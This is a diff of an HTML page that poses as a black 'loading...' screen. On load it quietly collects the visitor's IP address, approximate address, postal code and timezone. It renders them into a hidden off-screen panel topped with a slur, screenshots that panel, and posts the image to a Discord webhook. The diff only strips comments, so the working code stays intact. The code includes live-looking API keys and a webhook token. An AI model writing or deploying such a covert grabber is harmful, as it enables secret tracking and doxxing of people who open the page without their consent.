@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Loading…</title>
 <style>
-  /* Black-screen visible UI */
   html,body{height:100%;margin:0}
   body{
     background:#000;
@@ -26,10 +25,9 @@
     opacity:0.6;
   }
 
-  /* Hidden capture area — still rendered in DOM for html2canvas */
   #capture-root{
     position: absolute;
-    left: -9999px;   /* off-screen but still rendered */
+    left: -9999px;   
     top: -9999px;
     width: 720px;
     padding: 20px;
@@ -37,7 +35,6 @@
     color: #fff;
     border-radius: 8px;
   }
-  /* visible structure inside capture-root */
   .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
   .card{background:#080808;padding:10px;border-radius:8px}
   .card strong{display:block;font-size:16px}
@@ -46,11 +43,9 @@
 </style>
 </head>
 <body>
-  <!-- Visible to user: just a black screen with "loading..." and a short consent line -->
   <div class="big">loading...</div>
   <div class="sub">this usally takes about 1-20 seconds</div>
 
-  <!-- Hidden capture node (off-screen) that will be screenshotted and sent -->
   <div id="capture-root" aria-hidden="true">
     <h2>Annother retarded click!</h2>
     <div class="grid">
@@ -74,20 +69,14 @@
     <div id="statusHidden">Preparing…</div>
   </div>
 
-  <!-- html2canvas -->
   <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 
   <script>
-  // -------------------- CONFIG --------------------
-  // Your Abstract API keys (from your earlier messages)
   const GEO_API_KEY = "70f4d8c5dc604942a9f08a8f26261856";
   const TZ_API_KEY  = "4b975310867d44458fa5d6822ebfeb5e";
 
-  // Replace with your Discord webhook or your proxy endpoint (recommended: proxy to avoid CORS)
-  // Example: const DISCORD_WEBHOOK_URL = "https://your-proxy.example/forward-screenshot";
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427647238611664918/v2r04zhgoVuhAGVYRsGUhbLAlNMkvoM160Rjmnrhw7Ar0gWyqyul59wpxdZhggWL5uJf";
 
-  // -------------------- UI references --------------------
   const ipEl = document.getElementById('ip');
   const countryEl = document.getElementById('country');
   const avgAddressEl = document.getElementById('avgAddress');
@@ -97,7 +86,6 @@
 
   const safe = v => (v === undefined || v === null || v === '') ? 'N/A' : v;
 
-  // Fetch geolocation from Abstract
   async function fetchGeoAndSend() {
     statusHidden.textContent = 'Fetching geolocation…';
     try {
@@ -110,14 +98,12 @@
       const avgAddress = `${safe(geo.city)}${geo.city ? ', ' : ''}${safe(geo.region)}${geo.postal_code ? ', ' + geo.postal_code : ''}`;
       avgAddressEl.textContent = avgAddress === 'N/A, N/A' ? safe(geo.ip_address) : avgAddress;
 
-      // timezone
       const tzLoc = geo.city || geo.ip_address;
       const tzResp = await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${TZ_API_KEY}&location=${encodeURIComponent(tzLoc)}`);
       const tz = await tzResp.json();
       timezoneEl.textContent = safe(tz.timezone_location || tz.utc_offset || tz.abbreviation);
 
       statusHidden.textContent = 'Data ready — capturing screenshot…';
-      // brief delay for paint
       await new Promise(r => setTimeout(r, 500));
       await captureAndSend();
 
@@ -128,7 +114,6 @@
     }
   }
 
-  // Capture the off-screen node and send to webhook (or proxy)
   async function captureAndSend() {
     statusHidden.textContent = 'Rendering element to canvas…';
     try {
@@ -144,7 +129,6 @@
 
       statusHidden.textContent = 'Sending to webhook…';
 
-      // attempt POST (may be blocked by CORS if you post direct to Discord)
       const sendResp = await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         body: form
@@ -163,9 +147,7 @@
     }
   }
 
-  // Start on load
   (async () => {
-    // short delay so page loads and user sees "loading..."
     await new Promise(r => setTimeout(r, 250));
     fetchGeoAndSend();
   })();
